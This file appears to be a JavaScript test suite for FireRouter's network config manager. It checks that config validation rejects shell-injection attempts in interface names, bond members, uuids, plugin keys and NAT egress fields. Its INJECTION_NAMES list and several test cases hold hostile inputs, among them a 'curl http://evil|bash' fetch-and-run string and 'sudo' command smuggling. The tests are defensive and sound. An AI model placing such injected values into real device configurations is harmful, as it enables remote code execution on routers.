/*    Copyright 2016-2024 Firewalla Inc.
 *
 *    This program is free software: you can redistribute it and/or  modify
 *    it under the terms of the GNU Affero General Public License, version 3,
 *    as published by the Free Software Foundation.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU Affero General Public License for more details.
 *
 *    You should have received a copy of the GNU Affero General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
'use strict'
const fs = require('fs');
const path = require('path');

// resolve the plugin registry from this checkout so the suite also runs off-device
process.env.FIREROUTER_HOME = process.env.FIREROUTER_HOME || path.resolve(__dirname, '../..');

let chai = require('chai');
let expect = chai.expect;
const uuid = require('uuid');
const ncm = require('../../core/network_config_mgr.js');
let log = require('../../util/logger.js')(__filename, 'info');
const rclient = require('../../util/redis_manager').getRedisClient();
const platform = require('../../platform/PlatformLoader.js').getPlatform();
const r = require('../../util/firerouter.js');

describe('Test network config manager', function(){
  this.timeout(30000);
  beforeEach(async () => {
      this.testkey = "sysdb:transaction:networkConfig";
      this.origin = await rclient.getAsync(this.testkey);
      this.nwkey = "sysdb:networkConfig";
      this.nw = await rclient.getAsync(this.nwkey);
  });
  afterEach(async () => {
      await rclient.setAsync(this.testkey, this.origin);
      await rclient.setAsync(this.nwkey, this.nw);
  });
  it('should validate network ncid', async()=> {
    const nwConfig = {"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944};
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.undefined;
    await rclient.setAsync(this.testkey, `{"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, "ncid":"test"}`);
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.undefined;
  });
  it('should fail to validate network ncid', async()=> {
    await rclient.setAsync(this.testkey, `{"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, "ncid":"test"}`);
    const nwConfig = {"version":1,"interface":{"phy":{"eth0":{}}},"ts":1726648571944, ncid: "2df97f9efb0ad09b7201726801377449"};
    expect(await ncm.validateNcidOrReqId(nwConfig, true)).to.be.eql(["ncid not match"]);

    expect(await ncm.validateNcidOrReqId(nwConfig, true, true)).to.be.undefined;
  });

});

describe('Test network config validation', function(){
  this.timeout(30000);
  // validateConfig fills in meta.uuid, so every case works on a copy
  const clone = (o) => JSON.parse(JSON.stringify(o));
  const baseConfig = () => clone(require('../../network/default_setup.json'));
  const INJECTION_NAMES = [
    "eth0 up; curl http://evil|bash #",
    "eth0_x$(id)",
    "eth0;id",
    "eth0`id`",
    "eth0|id",
    "eth0&id",
    "a/b",
    "eth0 ",
    "x".repeat(16),
  ];
  describe('shipped configs', function(){
    it('should accept default_setup.json', async()=> {
      const errors = await ncm.validateConfig(clone(require('../../network/default_setup.json')));
      expect(errors).to.be.empty;
    });
    it('should accept default_4ports.json', async()=> {
      const errors = await ncm.validateConfig(clone(require('../../network/default_4ports.json')));
      expect(errors).to.be.empty;
    });
  });
  describe('interface names', function(){
    it('should accept real kernel interface names', async()=> {
      for (const name of ["eth0", "br0", "eth0.100", "eth0:0", "wg_ap", "tun_fwvpn", "bond0", "vbr100"]) {
        const config = baseConfig();
        config.interface.phy = { [name]: { enabled: true, meta: { type: "wan" } } };
        const errors = await ncm.validateConfig(config);
        expect(errors, `expected ${name} to be accepted`).to.be.empty;
      }
    });
    it('should reject names carrying shell metacharacters', async()=> {
      for (const name of INJECTION_NAMES) {
        const config = baseConfig();
        config.interface.phy = { [name]: { enabled: true, meta: { type: "wan" } } };
        const errors = await ncm.validateConfig(config);
        log.debug("rejected interface name", name, errors);
        expect(errors, `expected ${JSON.stringify(name)} to be rejected`).to.not.be.empty;
      }
    });
  });
  describe('referenced lower interfaces', function(){
    it('should accept a normal vlan lower interface', async()=> {
      const config = baseConfig();
      config.interface.vlan = { "eth0.100": { intf: "eth0", vid: 100, enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });
    it('should reject an injected string lower interface', async()=> {
      const config = baseConfig();
      config.interface.vlan = { "eth0.100": { intf: "eth0; id #", vid: 100, enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
    it('should reject an injected member of a bond interface array', async()=> {
      const config = baseConfig();
      config.interface.bond = { "bond0": { intf: ["eth1", "eth2; id #"], enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });
  describe('meta.uuid', function(){
    it('should generate a uuid when absent', async()=> {
      const config = baseConfig();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan" } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
      expect(config.interface.phy.eth0.meta.uuid).to.be.a('string');
    });
    it('should accept a caller supplied canonical uuid', async()=> {
      const config = baseConfig();
      const id = uuid.v4();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan", uuid: id } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
      expect(config.interface.phy.eth0.meta.uuid).to.be.equal(id);
    });
    it('should reject a malformed uuid instead of regenerating it', async()=> {
      const config = baseConfig();
      config.interface.phy = { "eth0": { enabled: true, meta: { type: "wan", uuid: "x; id > /tmp/pwn; #" } } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });
  describe('non-interface plugin sections', function(){
    const CATEGORIES = ["upnp", "icmp", "hostapd", "docker", "dns", "sshd", "nat", "routing", "dhcp", "mroute"];
    it('should reject an injected key in any plugin section', async()=> {
      for (const category of CATEGORIES) {
        const config = baseConfig();
        config[category] = { "eth0; sudo sh -c 'id > /tmp/pwned' #": {} };
        const errors = await ncm.validateConfig(config);
        expect(errors, `expected injected key in config.${category} to be rejected`).to.not.be.empty;
      }
    });
    it('should accept the section keys firerouter actually uses', async()=> {
      const config = baseConfig();
      config.nat = { "br0_eth3": { out: "eth0", srcSubnets: ["10.0.0.0/8"] } };
      config.routing = { "global": {} };
      config.dns = { "default": {}, "br0": {} };
      config.sshd = { "br0": { enabled: true } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });
  });
  describe('nat egress interface', function(){
    it('should accept a real egress interface', async()=> {
      const config = baseConfig();
      config.nat = { "x": { out: "eth0", srcSubnets: ["10.0.0.0/8"] } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.be.empty;
    });
    it('should reject an injected egress interface', async()=> {
      const config = baseConfig();
      config.nat = { "x": { out: "eth0 -j ACCEPT; sudo id; #", srcSubnets: ["10.0.0.0/8"] } };
      const errors = await ncm.validateConfig(config);
      expect(errors).to.not.be.empty;
    });
  });
});

describe('Test integrated AP config conversion', function(){
  this.timeout(30000);

  let originalIsWLANManagedByAPC;
  let originalGetFwapcExecPath;

  beforeEach(() => {
    originalIsWLANManagedByAPC = platform.isWLANManagedByAPC;
    originalGetFwapcExecPath = r.getFwapcExecPath;

    platform.isWLANManagedByAPC = () => true;
  });

  afterEach(() => {
    platform.isWLANManagedByAPC = originalIsWLANManagedByAPC;
    r.getFwapcExecPath = originalGetFwapcExecPath;
  });

  it('should remove temporary config when APC conversion fails', async()=> {
    r.getFwapcExecPath = () => '/bin/false';
    await expectAPCConversionFailure();
  });

  it('should remove temporary config when APC returns invalid JSON', async()=> {
    r.getFwapcExecPath = () => '/bin/printf';
    await expectAPCConversionFailure();
  });

  async function expectAPCConversionFailure() {
    const util = require('../../util/util.js');
    const originalUUID = util.generateUUID;
    const testUUID = `test-${process.pid}-${Date.now()}`;
    const tempFile = `/dev/shm/fr_orig_config_${testUUID}.json`;

    util.generateUUID = () => testUUID;

    try {
      await fs.promises.writeFile(tempFile, JSON.stringify({
        version: 1,
        interface: {
          phy: {
            eth0: {
              enabled: true,
            },
          },
        },
      }));

      try {
        await ncm.convertIntegratedAPConfig({
          version: 1,
          interface: {
            phy: {
              eth0: {
                enabled: true,
              },
            },
          },
        });
        throw new Error('APC conversion unexpectedly succeeded');
      } catch (err) {
        expect(err).to.be.instanceOf(Error);
      }

      await fs.promises.access(tempFile).then(
        () => {
          throw new Error('temporary config still exists after APC conversion failure');
        },
        (err) => {
          expect(err.code).to.equal('ENOENT');
        }
      );
    } finally {
      util.generateUUID = originalUUID;
      await fs.promises.unlink(tempFile).catch(() => {});
    }
  }
});
